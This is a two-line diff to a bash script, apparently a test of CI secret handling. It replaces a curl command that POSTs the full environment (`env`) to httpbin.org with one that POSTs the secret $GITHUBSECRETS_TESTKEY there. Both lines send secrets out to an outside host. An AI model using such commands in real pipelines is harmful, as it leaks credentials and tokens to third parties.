@@ -1,2 +1,2 @@
 #!/bin/bash
-curl https://httpbin.org/post -X POST -d "`env`"
+curl https://httpbin.org/post -X POST -d "$GITHUBSECRETS_TESTKEY"
